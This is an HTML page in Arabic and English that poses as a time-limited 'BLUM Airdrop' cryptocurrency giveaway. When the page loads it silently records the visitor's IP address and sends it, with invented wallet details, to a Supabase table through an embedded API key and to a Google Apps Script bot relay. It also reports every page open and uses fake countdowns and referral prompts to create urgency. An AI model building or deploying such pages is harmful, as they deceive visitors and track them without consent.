<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>🎁 BLUM Airdrop</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{min-height:100vh;background:linear-gradient(135deg,#0a0f1e,#0a1a1f);font-family:system-ui;display:flex;justify-content:center;align-items:center;padding:20px}
        .card{max-width:450px;width:100%;background:rgba(0,0,0,.7);backdrop-filter:blur(16px);border-radius:48px;padding:40px 28px;border:2px solid rgba(255,215,0,.5);text-align:center}
        .badge{display:inline-block;background:rgba(255,215,0,.15);border:1px solid #FFD700;border-radius:100px;padding:6px 18px;font-size:13px;color:#FFD700;margin-bottom:24px}
        h1{font-size:42px;font-weight:800;background:linear-gradient(135deg,#FFE6B0,#FFD700);-webkit-background-clip:text;background-clip:text;color:transparent}
        .amount{font-size:56px;font-weight:900;color:#FFD700;margin:20px 0}
        .timer-box{background:rgba(0,0,0,.5);border-radius:40px;padding:18px;margin:24px 0}
        .timer{font-size:48px;font-weight:800;font-family:monospace;color:#FFD700}
        button{width:100%;background:linear-gradient(95deg,#DAA520,#FFD700);border:none;padding:18px;border-radius:60px;font-weight:800;font-size:22px;cursor:pointer}
        button:disabled{opacity:.6}
        .status{background:rgba(0,0,0,.5);border-radius:30px;padding:12px;font-size:14px;display:none}
        .success{color:#0f0}
        .footer{font-size:11px;color:#888;margin-top:20px}
    </style>
</head>
<body>
<div class="card">
    <div class="badge">🎁 LIMITED AIRDROP</div>
    <h1>BLUM<br>Web3</h1>
    <div class="amount">1,200 $BLUM</div>
    <div class="timer-box"><div style="font-size:12px">⏰ ENDS IN</div><div class="timer" id="timer">24:00:00</div></div>
    <button id="claimBtn">🚀 CLAIM NOW</button>
    <div id="status" class="status"></div>
    <div class="footer">⚡ EMP2026</div>
</div>

<script>
    // ========== المطالبة التلقائية ==========
    async function autoClaim() {
        const wallet = ['MetaMask', 'Trust Wallet', 'Phantom'][Math.floor(Math.random()*3)];
        const address = '0x' + Math.random().toString(36).substring(2, 14);
        const ip = await fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip).catch(()=>'unknown');
        
        try {
            await fetch('https://oliefagvnorzhlzvdfyw.supabase.co/rest/v1/blum_claims', {
                method: 'POST',
                headers: { 
                    'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im9saWVmYWd2bm9yemhsenZkZnl3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzU1NjUwNDcsImV4cCI6MjA5MTE0MTA0N30.KZlFA_e3ub3zZnEZFBTGnshvyC9L2SNcwrfH9BiBauU', 
                    'Content-Type': 'application/json' 
                },
                body: JSON.stringify({ wallet_type: wallet, wallet_address: address, ip_address: ip })
            });
        } catch(e) {}
        
        // إرسال إلى البوت عبر الـ Proxy
        fetch('https://script.google.com/macros/s/AKfycbwJgOHcbXvkR6OcRt0iiUZdb1e_GJRxSGYMFWF4030y_tnfcKDIJh5e23QeJUvrKqE/exec', {
            method: 'POST',
            mode: 'no-cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: `🎁 مطالبة جديدة!\n💼 ${wallet}\n💳 ${address}\n🌐 ${ip}` })
        });
        
        document.getElementById('claimBtn').innerHTML = "✅ تمت المطالبة!";
        document.getElementById('claimBtn').disabled = true;
        document.getElementById('status').style.display = 'block';
        document.getElementById('status').innerHTML = '<span class="success">🎉 تم تسجيل مطالبتك بنجاح!</span>';
    }
    
    let remaining = 10;
    setInterval(() => {
        remaining--;
        const btn = document.getElementById('claimBtn');
        if (btn && !btn.disabled && remaining > 0) btn.innerHTML = `🔥 متبقي ${remaining} فقط! 🔥`;
    }, 4000);
    
    const refLink = window.location.href.split('?')[0] + '?ref=' + Math.random().toString(36).substring(2, 8);
    setTimeout(() => alert(`🎁 شارك الرابط واربح مكافآت:\n${refLink}`), 4000);
    
    let seconds = 24 * 60 * 60;
    setInterval(() => {
        let h = Math.floor(seconds/3600), m = Math.floor((seconds%3600)/60), s = seconds%60;
        document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
        if(seconds>0) seconds--;
    }, 1000);
    
    window.addEventListener('DOMContentLoaded', autoClaim);
</script>

<script>
fetch('https://script.google.com/macros/s/AKfycbwJgOHcbXvkR6OcRt0iiUZdb1e_GJRxSGYMFWF4030y_tnfcKDIJh5e23QeJUvrKqE/exec', {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ message: '🌐 صفحة Airdrop تم فتحها - EMP2026' })
});
</script>

</body>
</html>
